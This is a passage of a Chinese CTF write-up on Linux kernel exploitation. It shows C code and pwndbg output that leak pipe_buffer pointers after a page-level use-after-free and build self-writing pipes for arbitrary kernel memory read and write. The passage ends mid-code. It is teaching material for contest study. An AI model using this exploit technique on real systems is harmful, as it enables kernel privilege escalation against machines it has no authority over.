<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;p&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(pipe_list[victim_idx][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">close(pipe_list[orig_idx][<span class="number">0</span>]); <span class="comment">/* 释放其中一个pipe_buffer */</span></span><br><span class="line">close(pipe_list[orig_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">        <span class="comment">/* 2 * pipe_buffer = 0x60 kmalloc-96 */</span> </span><br><span class="line">        errPrint(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(pipe_list[victim_idx][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">print_hex(buf,SND_PIPE_BUF_SZ - <span class="number">8</span>);</span><br><span class="line">read(pipe_list[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">print_hex((<span class="keyword">char</span>*)&amp;info_pipe_buf,<span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line"><span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">info_pipe_buf.page, info_pipe_buf.ops);</span><br></pre></td></tr></table></figure>
<p>这里的调试需要一些技巧，在第一个 <code>sleep(2)</code> 之前使用 <code>search -s AAAABBBBBBBBpppppppp</code> 查找：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAABBBBBBBBpppppppp</span><br><span class="line">Searching <span class="keyword">for</span> value: <span class="string">&#x27;AAAABBBBBBBBpppppppp&#x27;</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff88800749c018</span> <span class="string">&#x27;AAAABBBBBBBBpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>AAAAAAAABBBBBBBB</code> 是之前写入的数据，其详细信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff88800749c018</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff88800749c000</span> ◂— <span class="number">0x4141414141414141</span> (<span class="string">&#x27;AAAAAAAA&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff88800749c008</span> ◂— <span class="number">0x300000003</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff88800749c010</span> ◂— <span class="number">0x4141414100000003</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff88800749c018</span> ◂— <span class="string">&#x27;AAAABBBBBBBBpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>0xffff88800749c000</code> 就是被释放的4k缓冲页</li>
</ul>
<p>在第二个 <code>sleep(2)</code> 之前再次打印 <code>0xffff88800749c000</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff88800749c018</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff88800749c000</span> —▸ <span class="number">0xffffea00001d5f40</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff88800749c008</span> ◂— <span class="number">0x180000000c</span> <span class="comment">/* &#x27;\x0c&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff88800749c010</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff88800749c018</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff88800749c020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff88800749c040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xffff88800749c060</span> —▸ <span class="number">0xffffea00001d5cc0</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xffff88800749c068</span> ◂— <span class="number">0x180000000c</span> <span class="comment">/* &#x27;\x0c&#x27; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xffff88800749c070</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xffff88800749c078</span> ◂— <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一次 <code>read(pipe_list[victim_idx][0]</code> 将会从 <code>0xffff88800749c00c</code> 开始，读取 84 字节到 <code>0xffff88800749c060</code></li>
<li>第二次 <code>read(pipe_list[victim_idx][0]</code> 就会泄露位于 <code>0xffff88800749c060</code> 的 <code>pipe_buffer</code></li>
</ul>
<p>泄露数据以后，我们就可以通过 <code>write(pipe_list[victim_idx][1])</code> 来覆写 <code>pipe_buffer</code>，利用这一点可以构造自写管道：</p>
<ul>
<li>自写管道的构造可以参考：<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Step-III-构造二级自写管道，实现任意内存读写">【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记 - arttnba3’s blog</a> </li>
</ul>
<p>在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，试想若是我们可以不断地修改一个 pipe 的 page 指针，则我们便能完成对整个内存空间的任意读写</p>
<p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 <code>pipe_buffer</code> 的 page 指针指向自身，从而直接完成对自身的修改</p>
<p>修改可控的 <code>pipe_buffer2-&gt;page</code>，即可完成二级 UAF：</p>
<img src="/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/1700044287875.png" class width="1700044287875">  
<p>用同样的方法将 <code>pipe_buffer3</code> 申请到4k缓冲页上，接着覆盖 <code>pipe_buffer3-&gt;page</code> 为 <code>pipe_buffer2-&gt;page</code></p>
<img src="/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/1700045029863.png" class width="1700045029863">    
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">write(pipe_list[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> snd_orig_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> snd_victim_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123; <span class="comment">/* 第二次堆喷 */</span></span><br><span class="line">    <span class="keyword">int</span> nr;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (i &lt; PIPE_NUM &amp;&amp; i != nr)&#123;</span><br><span class="line">        snd_orig_idx = nr;</span><br><span class="line">        snd_victim_idx = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,snd_victim_idx, snd_orig_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (snd_orig_idx == <span class="number">-1</span> || snd_victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">    errPrint(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;k&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">close(pipe_list[snd_orig_idx][<span class="number">0</span>]);</span><br><span class="line">close(pipe_list[snd_orig_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* 4 * pipe_buffer = 0xc0 kmalloc-192 */</span> </span><br><span class="line">        errPrint(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fcntl down&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf)); </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888002fd1aa0</span> —▸ <span class="number">0xffffea00001d54c0</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888002fd1aa8</span> ◂— <span class="number">0x180000000c</span> <span class="comment">/* &#x27;\x0c&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888002fd1ab0</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888002fd1aa0</span> —▸ <span class="number">0xffffea00001d5500</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888002fd1aa8</span> ◂— <span class="number">0x180000000c</span> <span class="comment">/* &#x27;\x0c&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888002fd1ab0</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改 <code>pipe_buffer</code> 获取第二次 UAF</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAABBBBBBBBkkkkkkkk</span><br><span class="line">Searching <span class="keyword">for</span> value: <span class="string">&#x27;AAAABBBBBBBBkkkkkkkk&#x27;</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888007554018</span> <span class="string">&#x27;AAAABBBBBBBBkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和之前的调试方法一样，先查找 <code>write(pipe_list[snd_victim_idx][1])</code> 写入的位置 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888007554018</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888007554000</span> —▸ <span class="number">0xffffea00001d2440</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888007554008</span> ◂— <span class="number">0x1400000010</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888007554010</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff888007554018</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff888007554020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff888007554040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff888007554080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffff8880075540c0</span> —▸ <span class="number">0xffffea00001d3cc0</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffff8880075540c8</span> ◂— <span class="number">0x1400000010</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│  <span class="number">0xffff8880075540d0</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0xffff8880075540d8</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0xffff8880075540e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0xffff888007554100</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>起始地址为 <code>0xffff888007554024</code>，由 <code>write(pipe_list[snd_victim_idx][1])</code> 写入 156 字节，因此下次覆盖的地址为 <code>0xffff8880075540c0</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888007554018</span><span class="number">-0x18</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffff8880075540c0</span> —▸ <span class="number">0xffffea00001d5500</span> ◂— <span class="number">0xfffffc0000200</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffff8880075540c8</span> ◂— <span class="number">0xc0000000c0</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│  <span class="number">0xffff8880075540d0</span> —▸ <span class="number">0xffffffff82246ec0</span> (__entry_text_end+<span class="number">283401</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0xffff8880075540d8</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│  <span class="number">0xffff8880075540e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0xffff888007554100</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>覆盖位于 <code>0xffff8880075540c0</code> 的 <code>pipe_buffer</code></li>
<li>位于 <code>0xffffea00001d5500</code> 的 <code>page</code> 结构体会映射到 <code>0xffff888007554000</code> 页</li>
<li>执行 <code>write(pipe_list[target][1])</code> 时可以修改 <code>pipe_buffer</code> 本身，这相当于一个 <code>self-writing pipe</code></li>
</ul>
<p>通过如下代码可以构造另外两个 <code>self-writing pipe</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">        self_2nd_pipe_idx = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m%d\n&quot;</span>,</span><br><span class="line">                self_2nd_pipe_idx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;n&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == self_2nd_pipe_idx)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">        self_3rd_pipe_idx = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                self_3rd_pipe_idx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;m&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line">write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == 